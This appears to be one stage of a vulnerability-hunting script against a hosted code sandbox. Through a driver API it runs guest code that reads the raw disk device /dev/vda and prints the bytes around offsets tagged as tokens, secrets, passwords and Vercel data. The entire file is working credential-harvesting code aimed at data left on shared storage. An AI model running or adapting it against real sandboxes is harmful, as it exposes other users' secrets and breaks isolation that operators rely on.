# -*- coding: utf-8 -*-
"""Phase36: 高价值命中上下文提取 (token/secret/cell/vercel 区域)"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_Cl9liLUyMxKTDz19T2QL6GseKvP3"  # fwtest14

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# 提取上下文 (前后 2KB)
offs = [
    0x18bf85003,  # token
    0x18bf86ce5,  # secret
    0x18bf88988,  # password
    0x18be9eea4,  # password
    0x2102002fb,  # vercel
    0x20fef002e,  # cell
    0x20fef143a,  # password
    0x2111eb9ea,  # secret
    0x18be8b00f,  # /etc/
]
for off in offs:
    try:
        chunk = os.pread(fd, 4096, off - 2048)
        # 只打印可打印部分
        txt = chunk.replace(b'\x00', b' ')
        print('[===== 0x%x =====]' % off, flush=True)
        print(txt[:3600].decode('latin1', 'replace'), flush=True)
    except Exception as e:
        print('[0x%x] EXC %s' % (off, e), flush=True)
os.close(fd)
print('done', flush=True)
'''
code = "cat > /tmp/pg44.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg44.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=120000)
    print('cmd:', c, flush=True)
    print(r[:14000], flush=True)
